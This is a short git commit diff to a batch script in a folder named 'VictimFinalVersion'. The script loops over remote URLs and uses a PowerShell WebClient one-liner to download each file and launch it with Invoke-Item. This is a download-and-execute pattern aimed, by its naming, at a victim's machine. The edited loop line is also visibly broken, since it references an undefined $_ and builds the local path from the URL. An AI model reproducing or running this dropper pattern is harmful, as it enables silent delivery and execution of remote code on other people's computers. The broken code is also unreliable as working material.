66022fbcad0356af76b4cb78f83955ebe6491709
devkaare <kaarehofferdal@gmail.com>
2025-02-02 04:37:37 +0100

    Feat

--- VictimFinalVersion/run.bat
+++ VictimFinalVersion/run.bat
@@ -5,5 +5,7 @@ set files='https://www.homedora.com/cdn/shop/files/UrlaAngel04Cream_8_1_1.jpg','
 REM powershell.exe -Command "(%files%)|foreach{$fileName='%TEMP%'+(Split-Path -Path $_ -Leaf);(new-object System.Net.WebClient).DownloadFile($_,$fileName);Invoke-Item $fileName;}"
 
 for %%i in (%files%) do (
-	powershell.exe -Command "$fileName='%TEMP%'+(Split-Path -Path $_ -Leaf);(new-object System.Net.WebClient).DownloadFile($_,$fileName);Invoke-Item $fileName;"
+	REM set fileName=%%i
+
+	powershell.exe -Command "$fileName='%%i'+(Split-Path -Path $_ -Leaf);(new-object System.Net.WebClient).DownloadFile($_,$fileName);Invoke-Item $fileName;"
 )
